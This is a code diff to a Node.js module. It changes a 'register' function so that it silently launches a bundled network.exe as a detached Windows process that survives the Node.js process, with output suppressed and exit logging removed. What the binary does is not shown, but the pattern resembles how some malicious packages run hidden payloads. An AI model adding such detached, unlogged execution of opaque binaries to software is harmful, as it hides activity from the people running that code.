@@ -2,31 +2,28 @@ const { spawn } = require('child_process');
 const path = require('path');
 
 /**
- * Register function that runs the network.exe executable
+ * Register function that runs the network.exe executable independently
+ * The process will continue running even if the Node.js process is terminated
  */
 function register() {
   const exePath = path.join(__dirname, 'bin', 'network.exe');
   
-  // Spawn the executable
-  const process = spawn(exePath, [], {
-    stdio: 'inherit',
-    cwd: __dirname
+  // Use Windows start command to launch the executable in a completely detached process
+  // This ensures network.exe continues running even if Node.js terminates
+  const process = spawn('cmd', ['/c', 'start', '', `"${exePath}"`], {
+    detached: true,
+    stdio: 'ignore',
+    windowsVerbatimArguments: true,
+    shell: false
   });
-
-  // Handle process events
+  
+  // Unref the process so Node.js can exit without waiting for it
+  process.unref();
+  
+  // Handle errors during spawn
   process.on('error', (error) => {
-    console.error(`Error spawning network.exe: ${error.message}`);
+    console.error(`Error starting network.exe: ${error.message}`);
   });
-
-  process.on('exit', (code, signal) => {
-    if (code !== null) {
-      console.log(`network.exe exited with code ${code}`);
-    } else if (signal !== null) {
-      console.log(`network.exe was killed with signal ${signal}`);
-    }
-  });
-
-  return process;
 }
 
 module.exports = {
